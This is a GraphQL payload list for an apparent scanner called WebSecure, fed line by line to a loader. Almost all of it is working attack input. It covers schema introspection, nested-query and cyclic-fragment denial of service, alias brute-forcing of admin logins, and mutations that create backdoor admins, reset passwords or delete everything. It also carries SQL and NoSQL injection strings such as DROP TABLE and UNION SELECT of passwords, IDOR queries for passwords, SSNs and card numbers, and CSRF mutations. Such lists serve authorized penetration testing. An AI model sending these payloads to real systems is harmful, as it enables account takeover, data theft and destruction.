# GraphQL Injection & Abuse Payloads — WebSecure
# FORMAT: Raw GraphQL query strings (NOT JSON-wrapped {"query":"..."})
# graphql.py loader wraps each line: {"query": "<line>"} → send as POST body
# Introspection | Depth | Batching | Alias | Mutation | Injection | IDOR | CSRF

# ── INTROSPECTION QUERIES ──
{ __schema { types { name } } }
{ __schema { queryType { fields { name description args { name type { name kind ofType { name kind } } } } } } }
{ __schema { mutationType { fields { name description args { name type { name } } } } } }
{ __schema { types { name kind fields { name type { name kind } } } } }
{ __type(name: "User") { fields { name type { name kind } } } }
{ __type(name: "Query") { fields { name args { name } } } }
{ __schema { directives { name description args { name } } } }
{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}
query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } } } fragment FullType on __Type { kind name }

# ── FIELD SUGGESTION (typo-based) ──
{ usr { id username password email } }
{ user { passwrd } }
{ users { secretToken adminFlag } }
{ admin { bypassAuth deleteAll } }
{ user { tok3n s3cret } }

# ── DEPTH / COMPLEXITY ATTACKS ──
{ users { friends { friends { friends { friends { friends { id } } } } } } }
{ a { a { a { a { a { a { a { a { a { a { id } } } } } } } } } } }
{ users { posts { comments { author { posts { comments { author { id } } } } } } } }

# ── ALIAS ATTACKS (batching via aliases) ──
{ a1: user(id: 1) { id username } a2: user(id: 2) { id username } a3: user(id: 3) { id username } }
{ login1: login(username:"admin", password:"pass1") { token } login2: login(username:"admin", password:"pass2") { token } login3: login(username:"admin", password:"pass3") { token } }
{ admin: user(role: "admin") { id password } superuser: user(role: "superuser") { id password } root: user(role: "root") { id password } }

# ── FRAGMENT CYCLING (DoS) ──
fragment A on User { ...B } fragment B on User { ...A } { user { ...A } }
{ users { ...UserFragment } } fragment UserFragment on User { id username ...UserFragment }

# ── MUTATION INJECTION ──
mutation { createUser(username: "attacker", password: "attacker", role: "admin") { id } }
mutation { updateUser(id: 1, role: "admin") { id username role } }
mutation { deleteUser(id: 1) { success } }
mutation { login(username: "admin", password: "' OR '1'='1") { token } }
mutation { updatePassword(userId: 1, newPassword: "hacked") { success } }
mutation { createAdmin(username: "ws_backdoor", password: "ws_backdoor") { id token } }
mutation { updateUser(where: {}, data: {role: "admin"}) { count } }
mutation { deleteAll { count } }
mutation { import(data: "{\"users\": [{\"role\":\"admin\"}]}") { success } }

# ── SQL INJECTION VIA GRAPHQL ──
{ users(filter: "1=1") { id username password } }
{ user(id: "1 OR 1=1") { id username password } }
{ user(username: "admin' OR '1'='1") { id password } }
{ users(search: "' UNION SELECT username,password FROM users--") { id username } }
{ user(id: "1; DROP TABLE users--") { id } }
{ users(orderBy: "id DESC; SELECT 1") { id } }
{ user(id: "1' AND SLEEP(3)--") { id } }
{ users(where: {id: {_eq: "1 OR 1=1"}}) { id username password } }
{ users(filter: {username: {_like: "%"}}) { id username password email } }

# ── NOSQL INJECTION VIA GRAPHQL ──
{ users(filter: {username: {$regex: ".*"}}) { id username password } }
{ user(filter: {$where: "1==1"}) { id username } }
{ users(where: {password: {$ne: ""}}) { id username password } }
{ users(filter: {_or: [{username: {_eq: "admin"}}, {id: {_gt: 0}}]}) { id username password } }

# ── IDOR / AUTHORIZATION BYPASS ──
{ user(id: 1) { id username email password apiKey secretKey } }
{ user(id: 2) { id username password creditCard ssn } }
{ users { id username email password role apiKey } }
{ admin { allUsers { id username password role } } }
{ order(id: "OTHER_USER_ORDER_ID") { id items total } }
{ message(id: 1) { id content sender recipient } }

# ── CSRF VIA GRAPHQL ──
mutation { changeEmail(email: "attacker@{{OOB}}") { success } }
mutation { changePassword(newPassword: "hacked") { success } }
mutation { deleteAccount { success } }
mutation { addAdmin(userId: 1337) { success } }

# ── SUBSCRIPTION ABUSE ──
subscription { userCreated { id username password role } }
subscription { messageReceived { content sender recipient } }
subscription { allEvents { type data } }

# ── DIRECTIVE INJECTION ──
{ users @deprecated { id username password } }
{ users @skip(if: false) { id username password } }
{ users @include(if: true) { id username password } }

# ── TYPE CONFUSION ──
{ ... on User { id username password } }
{ users { ... on Admin { adminToken superSecret } ... on User { id password } } }
{ node(id: "USER_ID") { ... on User { password } ... on Admin { accessToken } } }

# NOTE: Batch array queries [{"query":"..."},{"query":"..."}] are handled
# by GraphQLBatchDoSProber directly — do not add array format here.
# NOTE: URL paths (/graphql, /api/graphql etc.) and HTTP headers are managed
# by GraphQLScanner._discover_endpoints(), not this payload list.

# ── [v2026-06] MODERN / ADVANCED ADDITIONS ──
# tam introspection + tip/argüman keşfi
{ __schema { queryType { name } mutationType { name } subscriptionType { name } } }
{ __schema { directives { name args { name } } } }
{ __type(name:"Query"){ fields { name args { name type { name } } } } }
{ a:__typename b:__typename c:__typename }
mutation { __typename }
# alias tabanlı IDOR brute (tek istekte çok obje)
{ u1:user(id:1){ id email } u2:user(id:2){ id email } u3:user(id:3){ id email } }
# enjeksiyon argüman içine
{ search(q:"' OR 1=1-- "){ id } }
{ login(user:"admin", password:"\" OR \"1\"=\"1"){ token } }
# derinlik / batch DoS
query { posts(first:1000000){ id comments(first:1000000){ id author { posts { id } } } } }
fragment f on Query { __typename } query { ...f ...f ...f }
# direktif overloading + introspection filtre bypass
{ __schema @skip(if:false) { types { name } } }
# hassas alan keşfi (union/interface)
{ me { ... on Admin { secretKey } ... on User { passwordHash } } }
